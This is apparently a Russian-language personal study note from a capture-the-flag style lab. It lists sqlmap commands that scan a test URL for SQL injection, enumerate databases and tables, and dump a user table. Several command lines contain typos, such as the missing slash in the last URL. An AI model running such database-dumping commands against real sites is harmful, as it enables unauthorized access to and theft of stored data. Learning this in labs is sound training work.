---
title: "sqlMap"
id: note-09
created: "14.12.2025 17:03"
category: "05_Веб-уязвимости"
tags:
  - иб/веб
  - web
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `05_Веб-уязвимости` · Дата: `14.12.2025 17:03`

# sqlMap

sqlMap

Сканирование на уязвимости: 
sqlmap -u http://sqlmaptesting.thm/search/cat=1

Для получения доступа к базам данных мы используем флаг --dbs
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs

Выберите  users базу данных и получите список таблиц в ней. Мы определим базу данных после флага -Dи используем --tablesфлаг в конце, чтобы извлечь все имена таблиц.
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables

Мы определим базу данных с помощью  -Dфлага, таблицу с помощью  -Tфлага, а для извлечения записей из таблицы будем использовать  --dumpфлаг.
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
